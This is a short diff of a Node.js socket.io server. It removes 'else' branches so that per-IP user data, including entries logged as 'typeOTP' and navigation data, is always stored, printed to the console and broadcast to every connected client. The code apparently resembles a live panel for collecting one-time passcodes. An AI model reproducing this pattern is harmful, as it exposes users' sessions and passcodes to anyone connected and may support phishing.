@@ -389,7 +389,7 @@ io.on('connection', (socket, req) => {
             let userDetails = sessionStore.get(userIP);
             if(!userDetails.getUserDataNavig){
                 userDetails.getUserDataNavig = {};
-            } else {
+            } 
                 console.log('nextNavig')
                 console.log(data)
                 console.log(userIP)
@@ -398,7 +398,7 @@ io.on('connection', (socket, req) => {
                 console.log(userDetails)
                 sessionStore.set(userIP, userDetails);
                 io.emit('join', Array.from(sessionStore.entries()));
-            }
+            
         }
     })
 
@@ -407,7 +407,7 @@ io.on('connection', (socket, req) => {
             let userDetails = sessionStore.get(userIP);
             if(!userDetails.getUserDataType){
                 userDetails.getUserDataType = {};
-            } else {
+            } 
                 console.log('typeOTP')
                 console.log(data)
                 console.log(userIP)
@@ -416,7 +416,7 @@ io.on('connection', (socket, req) => {
                 console.log(userDetails)
                 sessionStore.set(userIP, userDetails);
                 io.emit('join', Array.from(sessionStore.entries()));
-            }
+            
         }
     })
     
